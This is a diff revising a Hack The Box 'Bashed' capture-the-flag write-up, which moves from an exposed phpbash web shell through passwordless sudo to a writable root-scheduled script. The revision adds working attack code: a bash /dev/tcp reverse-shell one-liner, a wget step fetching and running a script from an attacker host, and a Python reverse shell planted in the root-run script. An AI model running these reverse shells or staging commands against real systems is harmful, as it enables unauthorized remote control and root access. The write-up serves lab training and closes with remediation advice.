@@ -1,6 +1,6 @@
 ---
-title: "Bashed: Web Shell to Scheduled-Task Privilege Escalation"
-description: "Web enumeration exposes an accessible PHP web shell for command execution, followed by a constrained sudo identity transition and a writable root-executed script to reach root."
+title: "Bashed — Exposed Web Shell and Root-Scheduled Script Abuse"
+description: "Web enumeration exposes an interactive phpbash shell for www-data command execution, then a passwordless sudo transition and a writable root-scheduled script yield root."
 type: case-study
 platform: Hack The Box
 content_type: machine
@@ -10,101 +10,230 @@ tags:
   - linux
   - web-enumeration
   - privilege-escalation
+objective: "Move from an unauthenticated web foothold to root by abusing an exposed development web shell, a permissive sudo delegation, and a script that root executes on a schedule."
+tools:
+  - rustscan
+  - nmap
+  - feroxbuster
+  - wget
+  - netcat
+  - python3
+  - sudo
+skill: "Linux web foothold and privilege escalation via delegated sudo and writable scheduled scripts"
+outcome: "www-data command execution, a passwordless sudo transition to scriptmanager, and a root context via a writable root-executed script"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu Linux; Apache httpd 2.4.18 |
+| Starting position | Unauthenticated network access |
+| Objective | Unauthenticated web foothold to root via an exposed web shell, permissive sudo, and a root-run scheduled script |
+| Outcome | Command execution as `www-data`; root context via a writable, root-executed script |
 
 ## Summary
 
-This Hack The Box Linux lab demonstrates how web enumeration exposed an accessible PHP web shell, providing command execution as a low-privilege web account. The recorded path then used a constrained sudo rule and a writable script apparently executed by root. Target, operator, account, and credential-specific values are replaced with role-based placeholders.
+Bashed is an Easy Hack The Box Linux lab in which web enumeration exposes `phpbash`, an interactive PHP shell left in the document root, giving command execution as `www-data`. Privilege escalation follows two documented steps: a permit-any passwordless `sudo` rule to the `scriptmanager` account, and a Python script in `/scripts` that `scriptmanager` can overwrite but root runs on a schedule. Target and attacker addresses and callback ports are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** `Apache enumeration → exposed phpbash web shell → www-data command execution → hosted-script reverse shell → passwordless sudo to scriptmanager → writable root-scheduled script → root`
 
 ## Context and Objective
 
-The notes describe an Easy Linux machine with HTTP as the only exposed service. The objective was to move from exposed web functionality to a low-privilege shell, enumerate local authorization, and establish whether a root-executed scheduled script could be modified by a less-privileged account.
+- **Target:** an Ubuntu Linux host exposing a single web service — Apache httpd 2.4.18.
+- **Starting position:** unauthenticated network access.
+- **Objective:** turn an exposed web development artifact into a stable shell, then follow local authorization and scheduled-execution clues to root.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Identify the web entry point
+### 1. Service Enumeration
 
-**Observation.** The recorded service scan showed Apache HTTP on port 80, and directory enumeration identified a development directory containing PHP shell files.
+Observation: a full-port scan exposes a single HTTP service.
 
-**Action.** The notes used web content enumeration, then opened the identified PHP shell.
+```bash
+rustscan -a <TARGET_HOST> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
+```
+
+Truncated scan output:
+
+```text
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: <LAB_USER>'s Development Site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+```
+
+Significance: HTTP is the only reachable service, and the site title advertises a development site, so the web application is the entire external attack surface. The banner identifies the platform build.
+
+Result: Apache on port 80 is the only exposed service.
+
+### 2. Web Content Discovery
+
+Observation: directory enumeration reveals a development directory holding PHP shell files.
 
 ```bash
 feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
 ```
 
+Truncated discovery output:
+
 ```text
+/uploads
 /dev
+```
+
+The `/dev` path contains:
+
+```text
+phpbash.min.php
 phpbash.php
 ```
 
-**Significance.** An interactive shell exposed in a web-accessible development location turns an application discovery finding into command execution.
+Significance: a browsable directory containing an interactive PHP shell converts a content-discovery finding into a ready-made web command channel, and the shell file was reachable without authentication.
 
-**Supported result.** The recorded shell identified the execution context as the web-service account:
+Result: an interactive shell file is reachable under the web root.
 
-```text
-<WEB_SERVICE_USER>@<TARGET_HOST>:<WEB_ROOT>/dev$ whoami
-<WEB_SERVICE_USER>
-```
+### 3. Web Shell Command Execution
 
-### Enumerate delegated sudo access
+Observation: browsing `/dev/phpbash.php` serves an interactive browser-based shell that runs commands as the web server account.
 
-**Observation.** Local sudo enumeration showed that the web-service account could run commands as a separate script-management account without a password.
-
-**Action.** The notes switched to that permitted account.
+Representative interaction:
 
 ```bash
-sudo -u <SCRIPT_MANAGER_USER> /bin/bash
+www-data@bashed:/var/www/html/dev# whoami
+www-data
 ```
 
-```text
-(<SCRIPT_MANAGER_USER> : <SCRIPT_MANAGER_USER>) NOPASSWD: ALL
-```
+Significance: the shell executes arbitrary commands in the context of `www-data`, the Apache service account, giving unauthenticated code execution on the host.
 
-**Significance.** A narrowly scoped identity transition can expose writable operational files unavailable to the web-service account.
+Result: command execution as `www-data` is established.
 
-**Supported result.** The notes report an interactive shell as the script-management account after the sudo transition.
+### 4. Shell Stabilization
 
-### Assess writable scheduled-task material
+Observation: the browser shell is unsuitable for sustained interactive work, and direct reverse-shell one-liners launched from it are unreliable.
 
-**Observation.** The notes showed a Python script writable by the script-management account alongside an output file owned by root. The output file was reported to be rewritten repeatedly.
+Action: host a small shell script on the attacker host, download it to a temporary path on the target, and execute it to receive a reverse shell.
 
-**Action.** The recorded approach replaced the writable script with sanitized callback logic and waited for scheduled execution.
+On the attacker:
 
 ```bash
-cat > /scripts/test.py <<'PY'
-# <SANITIZED_ROOT_CONTEXT_CALLBACK_LOGIC>
-PY
+echo 'bash -i >& /dev/tcp/<ATTACKER_HOST>/<REVSHELL_PORT> 0>&1' > bashell.sh
+python3 -m http.server 80
+nc -nlvp <REVSHELL_PORT>
+```
+
+On the target, through the web shell:
+
+```bash
+wget http://<ATTACKER_HOST>/bashell.sh -O /tmp/revshell.sh
+bash /tmp/revshell.sh
+```
+
+The shell returns:
+
+```text
+www-data@bashed:/var/www/html/dev$
+```
+
+Significance: moving from a browser-based shell to a network shell yields a stable, scriptable session, which the recorded approach preferred over a direct one-liner.
+
+Result: an interactive network shell as `www-data` is obtained.
+
+### 5. Sudo Enumeration and Identity Transition
+
+Observation: local `sudo` enumeration shows the web-service account may run any command as the script-management account without a password.
+
+```bash
+sudo -l
 ```
 
 ```text
--rw-r--r-- 1 <SCRIPT_MANAGER_USER> <SCRIPT_MANAGER_USER> test.py
--rw-r--r-- 1 root                  root                  test.txt
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-**Significance.** Writable code executed by root is a privilege-boundary failure; file ownership and repeated root-owned output provided recorded basis for investigating scheduled execution.
+Action — switch to the permitted account:
 
-**Supported result.** The notes report that, after scheduled task ran, callback context was root:
+```bash
+sudo -u scriptmanager /bin/bash
+```
+
+Significance: an unrestricted delegation rule grants full command execution as `scriptmanager`, which can reach files the web-service account cannot. The transition's own prompt is not recorded; the permission grant is shown, and the next stage runs in the script-management context.
+
+Result: control moves to the `scriptmanager` account.
+
+### 6. Writable Scheduled Script to Root
+
+Observation: `/scripts` holds a Python script owned by `scriptmanager` beside an output file owned by root that is rewritten repeatedly — evidence that root executes the script on a schedule.
+
+```bash
+ls -la /scripts
+```
+
+```text
+-rw-r--r-- 1 scriptmanager scriptmanager 58 test.py
+-rw-r--r-- 1 root          root          12 test.txt
+```
+
+Action — replace the writable script with callback logic and catch the root execution:
+
+```python
+# /scripts/test.py (replaced by scriptmanager)
+import os
+import socket
+import subprocess
+
+HOST = "<ATTACKER_HOST>"
+PORT = <ROOT_CALLBACK_PORT>
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+
+subprocess.call(["/bin/sh", "-i"])
+```
+
+```bash
+nc -nlvp <ROOT_CALLBACK_PORT>
+```
+
+After the scheduled task runs:
 
 ```text
 # whoami
 root
 ```
 
+Significance: root executes a script that a lower-privileged account can overwrite, so whatever is written into `test.py` runs with root privileges — a direct privilege-boundary failure.
+
+Result: the callback returns as root, confirmed by `whoami`.
+
 ## Challenges and Decisions
 
-The notes report that direct reverse-shell one-liners from web shell were unreliable. They instead used a small hosted script executed from a temporary location. Operational specifics are omitted because they are not required to explain access path.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| Direct reverse-shell one-liners from the browser web shell were unreliable | Hosted a small shell script and executed it from a temporary location | A staged scripted payload was the recorded, more reliable path |
 
 ## Outcome
 
-Recorded evidence establishes command execution through an exposed development web shell, passwordless transition to a script-management account, and a root context after modifying a script associated with recurring root-owned output. Notes do not include independent scheduler configuration or a complete callback transcript, so scheduled root execution is reported as documented interpretation of those observations.
+The evidence establishes a root context after overwriting a script that root executes on a schedule. One limit remains: the scheduler configuration itself is not captured, so root execution is inferred from the script/output ownership mismatch and the repeatedly rewritten root-owned output.
 
 ## Lessons and Recommendations
 
-- Remove development shells and administrative tooling from web-accessible directories before deployment.
-- Restrict sudo rules to specific required commands and avoid unrestricted command execution under other accounts.
-- Ensure scripts executed by privileged schedulers are writable only by privileged owner and monitor changes to scheduled-task directories.
-- Recommendations derive from recorded access path; notes do not document remediation testing.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. These actions are recommendations; none was validated in the lab.
+
+1. **Development shell left in the web root.** `phpbash.php` was reachable without authentication and gave code execution as `www-data`. *Recommendation:* remove administrative and diagnostic tooling from web-accessible directories and deploy only required application files. *Detection:* alert on shell-like files and on requests that execute them.
+2. **Overly permissive sudo delegation.** A `NOPASSWD: ALL` rule let the web-service account run arbitrary commands as `scriptmanager`. *Recommendation:* scope `sudoers` to specific binaries and arguments instead of unrestricted command execution as another account. *Detection:* review `sudo -l` output and audit `sudoers` for blanket `NOPASSWD: ALL` grants.
+3. **Root-executed script writable by a lower-privileged account.** `scriptmanager` could overwrite `test.py`, which root ran on a schedule, yielding root code execution. *Recommendation:* keep privileged scheduled scripts and their directories writable only by root, and run non-root schedulers without privilege. *Detection:* monitor scheduled-task scripts and directories for unexpected content changes.
 
 ## References
 
-- Hack The Box [Bashed](https://app.hackthebox.com/machines/Bashed) machine, based on independently curated lab notes.
+- [Hack The Box — Bashed](https://app.hackthebox.com/machines/Bashed) (retired machine)
+- [RustScan](https://github.com/RustScan/RustScan)
+- [feroxbuster](https://github.com/epi052/feroxbuster)
+- [phpbash](https://github.com/Arrexel/phpbash)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [Apache HTTP Server 2.4 Documentation](https://httpd.apache.org/docs/2.4/)
